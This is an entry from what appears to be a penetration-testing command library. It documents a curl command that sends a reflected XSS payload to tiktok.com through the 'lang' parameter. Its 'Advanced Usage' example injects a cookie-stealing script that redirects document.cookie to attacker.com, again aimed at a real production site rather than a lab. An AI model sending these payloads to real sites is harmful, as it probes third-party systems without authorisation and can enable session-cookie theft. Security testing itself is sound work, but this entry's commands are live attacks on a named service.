---
id: cmd-inject-xss-payload
data: >-
  curl -s
  "https://www.tiktok.com/?lang=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E"
  | grep -i script
tags:
  - xss
  - testing
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:13.136Z'
verified: false
validated: true
submitted: true
---
# inject-xss-payload

## Command

```bash
curl -s "https://www.tiktok.com/?lang=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E" | grep -i script
```

## Description

This command tests for reflected XSS by sending a URL-encoded JavaScript payload via the language parameter and checking if the script tag is present in the response, indicating lack of sanitization.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode to suppress progress meter | Yes |
| URL | Target URL with encoded payload in lang parameter | Yes |
| `| grep -i script` | Pipe to search for script indicators in output | Yes |

## Examples

### Basic Usage

```bash
curl -s "https://www.tiktok.com/?lang=test" | grep "test"
```

### Advanced Usage

```bash
curl -s "https://m.tiktok.com/?lang=%3Cscript%3Edocument.location=%27http://attacker.com?%27+document.cookie%3C/script%3E" -v
```

## Expected Output

If vulnerable, output includes lines with '<script>' or the payload, e.g., "<script>alert('XSS')</script>". No output or encoded payload indicates sanitization.

## Related

- [[Related Procedure: Exploit-Reflected-XSS-in-Language-Parameter]]
